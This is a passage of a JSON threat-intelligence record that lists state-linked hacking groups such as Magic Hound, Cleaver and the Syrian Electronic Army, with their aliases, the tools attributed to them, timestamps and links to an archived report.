            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "dfee8b2e-d6b9-4143-a0d9-ca39396dd3bf",
            "created_at": "2022-10-25T16:07:24.467088Z",
            "updated_at": "2025-03-27T02:02:10.241387Z",
            "deleted_at": null,
            "main_name": "Circles",
            "aliases": [],
            "source_name": "ETDA:Circles",
            "tools": [],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "bb08058c-a744-4129-aa80-10aa34ed8766",
            "created_at": "2022-10-25T16:07:24.474826Z",
            "updated_at": "2025-03-27T02:02:10.245391Z",
            "deleted_at": null,
            "main_name": "Cyber fighters of Izz Ad-Din Al Qassam",
            "aliases": [
                "Cyber fighters of Izz Ad-Din Al Qassam",
                "Fraternal Jackal",
                "QCF",
                "Qassam Cyber Fighters"
            ],
            "source_name": "ETDA:Cyber fighters of Izz Ad-Din Al Qassam",
            "tools": [],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "8faa11f5-2a14-479c-9ea8-3779e6de9749",
            "created_at": "2022-10-25T15:50:23.814205Z",
            "updated_at": "2025-03-27T02:00:55.551798Z",
            "deleted_at": null,
            "main_name": "Ajax Security Team",
            "aliases": [
                "Ajax Security Team",
                "Operation Woolen-Goldfish",
                "AjaxTM",
                "Rocket Kitten",
                "Flying Kitten",
                "Operation Saffron Rose"
            ],
            "source_name": "MITRE:Ajax Security Team",
            "tools": [
                "sqlmap",
                "Havij"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "f4d7cba1-dbdd-42a9-88c5-4d0c81659ee0",
            "created_at": "2023-01-06T13:46:38.357581Z",
            "updated_at": "2025-03-27T02:00:02.813318Z",
            "deleted_at": null,
            "main_name": "Flying Kitten",
            "aliases": [
                "Saffron Rose",
                "AjaxSecurityTeam",
                "Ajax Security Team",
                "Group 26",
                "Sayad",
                "SaffronRose"
            ],
            "source_name": "MISPGALAXY:Flying Kitten",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "2f498e6b-3f0e-4f26-8cc7-52121e675643",
            "created_at": "2023-01-06T13:46:38.447274Z",
            "updated_at": "2025-03-27T02:00:02.835821Z",
            "deleted_at": null,
            "main_name": "Deadeye Jackal",
            "aliases": [
                "SyrianElectronicArmy"
            ],
            "source_name": "MISPGALAXY:Deadeye Jackal",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "49f1ada0-181f-4e89-a449-e6bc13c8c6b1",
            "created_at": "2022-10-25T15:50:23.561511Z",
            "updated_at": "2025-03-27T02:00:55.499988Z",
            "deleted_at": null,
            "main_name": "Cleaver",
            "aliases": [
                "Threat Group 2889",
                "TG-2889"
            ],
            "source_name": "MITRE:Cleaver",
            "tools": [
                "Net Crawler",
                "PsExec",
                "TinyZBot",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "1a76ed30-4daf-4817-98ae-87c667364464",
            "created_at": "2022-10-25T16:47:55.891029Z",
            "updated_at": "2025-03-27T02:05:17.408867Z",
            "deleted_at": null,
            "main_name": "IRON LIBERTY",
            "aliases": [
                "ATK6 ",
                "BROMINE ",
                "CASTLE ",
                "Crouching Yeti ",
                "DYMALLOY ",
                "Dragonfly ",
                "Energetic Bear / Berserk Bear ",
                "Ghost Blizzard ",
                "TEMP.Isotope ",
                "TG-4192 ",
                "ALLANITE "
            ],
            "source_name": "Secureworks:IRON LIBERTY",
            "tools": [
                " Ddex Loader",
                " Havex",
                " Karagany",
                " Loek",
                " MCMD",
                " Sysmain",
                " xfrost",
                "ClientX"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "76fc6d92-0710-4640-bfa7-3000fe3940a5",
            "created_at": "2022-10-25T16:07:24.251595Z",
            "updated_at": "2025-03-27T02:02:10.151254Z",
            "deleted_at": null,
            "main_name": "Syrian Electronic Army (SEA)",
            "aliases": [
                "ATK 196",
                "Deadeye Jackal",
                "Syria Malware Team",
                "Syrian Electronic Army",
                "TAG-CT2"
            ],
            "source_name": "ETDA:Syrian Electronic Army (SEA)",
            "tools": [
                "AndoServer",
                "CypherRat",
                "SLRat",
                "SandroRAT",
                "SilverHawk",
                "SpyNote",
                "SpyNote RAT"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "217c588a-5896-4335-b9ec-a516ae2f9a7e",
            "created_at": "2022-10-25T16:07:23.513775Z",
            "updated_at": "2025-03-27T02:02:09.838687Z",
            "deleted_at": null,
            "main_name": "Cutting Kitten",
            "aliases": [
                "Cutting Kitten",
                "Operation Cleaver",
                "TG-2889"
            ],
            "source_name": "ETDA:Cutting Kitten",
            "tools": [
                "CsExt",
                "DistTrack",
                "IvizTech",
                "Jasus",
                "KAgent",
                "Logger Module",
                "MANGOPUNCH",
                "MPK",
                "MPKBot",
                "Net Crawler",
                "NetC",
                "PVZ-In",
                "PVZ-Out",
                "Pupy",
                "PupyRAT",
                "PvzOut",
                "Shamoon",
                "SynFlooder",
                "SysKit",
                "TinyZBot",
                "WndTest",
                "pupy",
                "zhCat",
                "zhMimikatz"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "029625d2-9734-44f9-9e10-b894b4f57f08",
            "created_at": "2023-01-06T13:46:38.364105Z",
            "updated_at": "2025-03-27T02:00:02.815023Z",
            "deleted_at": null,
            "main_name": "Charming Kitten",
            "aliases": [
                "Parastoo",
                "iKittens",
                "Group 83",
                "NewsBeef",
                "G0058",
                "CharmingCypress"
            ],
            "source_name": "MISPGALAXY:Charming Kitten",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "08a3b64c-8e18-455d-af57-28dca63808c4",
            "created_at": "2024-05-01T02:03:08.027871Z",
            "updated_at": "2025-03-27T02:05:17.313679Z",
            "deleted_at": null,
            "main_name": "COBALT ILLUSION",
            "aliases": [
                "APT42 ",
                "Charming Kitten ",
                "CharmingCypress ",
                "ITG18 ",
                "Magic Hound ",
                "Mint Sandstorm sub-group ",
                "NewsBeef ",
                "Newscaster ",
                "PHOSPHORUS sub-group ",
                "TA453 ",
                "UNC788 ",
                "Yellow Garuda ",
                "APT35 "
            ],
            "source_name": "Secureworks:COBALT ILLUSION",
            "tools": [
                " MagicHound Toolset",
                " PupyRAT",
                "Browser Exploitation Framework (BeEF)"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "3fff98c9-ad02-401d-9d4b-f78b5b634f31",
            "created_at": "2023-01-06T13:46:38.376868Z",
            "updated_at": "2025-03-27T02:00:02.818071Z",
            "deleted_at": null,
            "main_name": "Cleaver",
            "aliases": [
                "Cobalt Gypsy",
                "G0003",
                "Operation Cleaver",
                "Op Cleaver",
                "Tarh Andishan",
                "Alibaba",
                "TG-2889"
            ],
            "source_name": "MISPGALAXY:Cleaver",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "e3676dfe-3d40-4b3a-bfbd-4fc1f8c896f4",
            "created_at": "2022-10-25T15:50:23.808974Z",
            "updated_at": "2025-03-27T02:00:55.550912Z",
            "deleted_at": null,
            "main_name": "Magic Hound",
            "aliases": [
                "Magic Hound",
                "TA453",
                "COBALT ILLUSION",
                "Charming Kitten",
                "ITG18",
                "Phosphorus",
                "APT35",
                "Mint Sandstorm"
            ],
            "source_name": "MITRE:Magic Hound",
            "tools": [
                "Impacket",
                "CharmPower",
                "FRP",
                "Mimikatz",
                "Systeminfo",
                "ipconfig",
                "netsh",
                "PowerLess",
                "Pupy",
                "DownPaper",
                "PsExec",
                "Havij",
                "sqlmap"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "1699fb41-b83f-42ff-a6ec-984ae4a1031f",
            "created_at": "2022-10-25T16:07:23.83826Z",
            "updated_at": "2025-03-27T02:02:09.995863Z",
            "deleted_at": null,
            "main_name": "Magic Hound",
            "aliases": [
                "APT 35",
                "Ballistic Bobcat",
                "Charming Kitten",
                "CharmingCypress",
                "Cobalt Illusion",
                "Cobalt Mirage",
                "Educated Manticore",
                "Magic Hound",
                "Mint Sandstorm",
                "Operation BadBlood",
                "Operation Sponsoring Access",
                "Operation SpoofedScholars",
                "Operation Thamar Reservoir",
                "Phosphorus",
                "TA453",
                "TEMP.Beanie",
                "Tarh Andishan",
                "Timberworm",
                "TunnelVision",
                "UNC788",
                "Yellow Garuda"
            ],
            "source_name": "ETDA:Magic Hound",
            "tools": [
                "7-Zip",
                "AnvilEcho",
                "BASICSTAR",
                "CORRUPT KITTEN",
                "CWoolger",
                "CharmPower",
                "ChromeHistoryView",
                "CommandCam",
                "DistTrack",
                "DownPaper",
                "FRP",
                "Fast Reverse Proxy",
                "FireMalv",
                "Ghambar",
                "GoProxy",
                "GorjolEcho",
                "HYPERSCRAPE",
                "Havij",
                "MPK",
                "MPKBot",
                "Matryoshka",
                "Matryoshka RAT",
                "MediaPl",
                "Mimikatz",
                "MischiefTut",
                "NETWoolger",
                "NOKNOK",
                "PINEFLOWER",
                "POWERSTAR",
                "PowerLess Backdoor",
                "PsList",
                "Pupy",
                "PupyRAT",
                "SNAILPROXY",
                "Shamoon",
                "TDTESS",
                "WinRAR",
                "WoolenLogger",
                "Woolger",
                "pupy",
                "sqlmap"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716492,
    "ts_updated_at": 1743041771,
    "ts_creation_date": 1417494303,
    "ts_modification_date": 1417494312,
    "files": {
        "pdf": "https://archive.orkl.eu/eab03ae476c002161e00411d136b311a6b434745.pdf",
        "text": "https://archive.orkl.eu/eab03ae476c002161e00411d136b311a6b434745.txt",
        "img": "https://archive.orkl.eu/eab03ae476c002161e00411d136b311a6b434745.jpg"
    }
}